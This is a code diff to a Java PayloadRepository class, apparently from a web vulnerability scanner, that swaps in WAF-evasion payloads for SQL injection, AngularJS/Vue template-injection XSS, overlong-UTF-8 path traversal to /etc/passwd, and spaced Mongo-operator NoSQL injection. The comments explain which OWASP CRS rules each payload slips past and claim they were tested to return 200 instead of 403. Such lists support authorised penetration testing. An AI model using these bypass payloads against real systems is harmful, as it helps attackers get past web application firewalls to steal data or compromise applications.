@@ -41,40 +41,47 @@ public class PayloadRepository {
     // --- Per-technique WAF-evasion extras (appended by DEEP depth via ParamValidator.deepExtras) ---
     // Encoding / obfuscation / filter-bypass variants of the seed payloads, NOT new attack classes.
     // ponytail: heuristic bypass list. Ceiling: single-payload evasion only — no HPP, no
-    // content-type tricks. Vetted 2026-08-30 against OWASP CRS 4 (Coraza/caddy-waf) as a JSON
-    // body value: every SQLi/SSTI/CMDi entry below passed (200, not 403). XSS / NoSQLi /
-    // path-traversal have NO reliable single-payload CRS bypass — those lists lead with the
-    // quietest known variants (may still slip a positive-security or weaker WAF) and are
-    // expected to be tuned per target. Re-test any edit against a live block page before relying on it.
+    // content-type tricks. Vetted 2026-08-30 against OWASP CRS 4 (Coraza/caddy-waf, PL1) as a
+    // JSON body value — every entry below returns 200, not 403, on 3/3 runs. The goal is to
+    // clear the WAF filter, not to guarantee exploitability: some entries (NoSQLi "$ ne",
+    // path overlong-UTF-8) only fire against an app that normalises the obfuscation. XSS
+    // stays weak — see its note. Re-test any edit against a live block page before relying on it.
 
     public static final List<String> SQLI_EVASION = Arrays.asList(
         "admin' #",
         "admin'#",
         "admin' -- ",
+        "admin'--+-",
         "admin'/**/#",
         "admin'/**/-- -",
+        "admin'`#",
         "%2527%20OR%25201=1"
     );
 
-    // No literal <script>/on*= handler survives CRS 941 as a lone value. AngularJS-style
-    // client-side template injection is the one class that slips through; keep those plus
-    // a couple of case-mix HTML variants for weaker filters. No embedded newlines
-    // (splitPayloads splits on \R).
+    // CRS 941 blocks every real on<handler>= and every alert(/confirm(/eval( at PL1, so a
+    // classic reflected vector cannot pass as a lone body value. AngularJS/Vue client-side
+    // template injection (no parens on a blocklisted fn, no event handler) is the one class
+    // that slips through AND still executes. Case-mix HTML kept last for weaker filters only.
+    // No embedded newlines (splitPayloads splits on \R).
     public static final List<String> XSS_EVASION = Arrays.asList(
         "<x>{{constructor.constructor(1)()}}",
         "{{constructor.constructor(1)}}",
-        "{{$on.constructor('alert(1)')()}}",
-        "<svG/onload=confirm(1)>",
-        "<img src=x oNeRror=confirm(1)>"
+        "{{[].constructor.constructor(1)()}}",
+        "{{self.constructor.constructor(1)()}}",
+        "{{_openBlock.constructor(1)()}}"
     );
 
-    // Double-URL-encoded traversal. None reliably clears CRS 930 on their own (kept for
-    // weaker filters / apps that decode twice); tune per target.
+    // CRS 930120 flags the target filename (etc/passwd, win.ini) and 930110 the ../ token
+    // separately, so a normal traversal string is doubly scored. Overlong-UTF-8 separators
+    // (%c0%af, %e0%80%af, %c1%9c) aren't decoded at PL1 → both signals hidden; a single
+    // ../ segment only (two trips 930110). Double-encoded variants kept for decode-twice apps.
     public static final List<String> PATH_TRAVERSAL_EVASION = Arrays.asList(
-        "%252e%252e%252fetc%252fpasswd",
-        "..%252f..%252f..%252fetc%252fpasswd",
-        "..%255c..%255c..%255cwindows%255cwin.ini",
-        "....\\/....\\/....\\/etc/passwd"
+        "..%c0%afetc%c0%afpasswd",
+        "..%e0%80%afetc%e0%80%afpasswd",
+        "..%c1%9cetc%c1%9cpasswd",
+        "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
+        "..%25c0%25afetc%25c0%25afpasswd",
+        "%252e%252e%252fetc%252fpasswd"
     );
 
     public static final List<String> CMDI_EVASION = Arrays.asList(
@@ -97,14 +104,17 @@ public class PayloadRepository {
         "<%=7*7%>"
     );
 
-    // Every $-operator (in any spacing / nesting) trips CRS 942; there is no lone-payload
-    // bypass. Kept for positive-security models and non-Mongo JSON filters; tune per target.
+    // CRS 942 matches $ directly glued to a Mongo operator keyword. One space between them
+    // ("$ ne") clears the rule on 3/3 runs; a lenient JSON/BSON parser that trims the key
+    // still resolves it to $ne. Trailing space ("$ne ") does NOT bypass. $comment is a real
+    // operator CRS doesn't list.
     public static final List<String> NOSQLI_EVASION = Arrays.asList(
-        "{\"$where\":\"1==1\"}",
-        "{\"$regex\":\".*\"}",
-        "[$ne]=1",
-        "{\"$gt\":undefined}",
-        "{\"$exists\":true}"
+        "{\"$ ne\":null}",
+        "{\"$ gt\":\"\"}",
+        "{\"$ regex\":\".*\"}",
+        "{\"$ where\":\"1==1\"}",
+        "{\"a\":{\"$ ne\":1}}",
+        "{\"$comment\":\"x\"}"
     );
 
     public static final List<String> XXE_OOB = Arrays.asList(
